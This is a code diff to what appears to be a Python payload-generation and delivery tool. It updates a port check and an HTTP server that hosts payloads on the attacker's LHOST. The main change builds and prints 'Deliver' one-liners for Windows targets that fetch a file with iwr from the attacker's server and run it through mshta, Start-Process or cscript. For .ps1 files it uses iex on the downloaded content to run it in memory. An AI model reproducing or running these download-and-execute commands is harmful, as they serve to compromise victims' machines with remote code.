@@ -653,8 +653,9 @@ atexit.register(_cleanup_listeners)
 
 
 def _port_in_use(port):
-    """Check if a TCP port is already bound."""
+    """Check if a TCP port is already bound (ignores TIME_WAIT)."""
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     try:
         s.bind(('', port))
         return False
@@ -707,7 +708,20 @@ def _start_http_server(port, lhost='', filename=''):
         host_display = lhost or '<LHOST>'
         fname = filename or '<file>'
         print(f"\n{G}\u2714{RS} HTTP server started  {DM}:{port}{RS}")
-        print(f"  {DM}Fetch:{RS}  {C}iwr http://{host_display}:{port}/{fname} -OutFile {fname}{RS}")
+        url = f"http://{host_display}:{port}/{fname}"
+        ext = os.path.splitext(fname)[1].lower()
+        dest = f"$env:TEMP\\{fname}"
+        if ext == '.hta':
+            oneliner = f"iwr '{url}' -OutFile {dest}; mshta {dest}"
+        elif ext == '.bat':
+            oneliner = f"iwr '{url}' -OutFile {dest}; Start-Process {dest}"
+        elif ext == '.vbs':
+            oneliner = f"iwr '{url}' -OutFile {dest}; cscript //nologo {dest}"
+        elif ext == '.ps1':
+            oneliner = f"iex(iwr '{url}').Content"
+        else:
+            oneliner = f"iwr '{url}' -OutFile {dest}"
+        print(f"  {DM}Deliver:{RS}  {C}{oneliner}{RS}")
     except OSError as e:
         print(f"\n{R}[!]{RS} Could not start HTTP server: {e}")
 
@@ -1346,7 +1360,7 @@ def payload_ready_actions(result, custom_payload=None):
             return
 
         elif sel == '8' and menu_has_stop:
-            return
+            print(f"{R}[!]{RS} Stop the HTTP server first {DM}(option 7){RS}.")
 
         elif sel == '0':
             print(f"\n{DM}Exiting.{RS}")
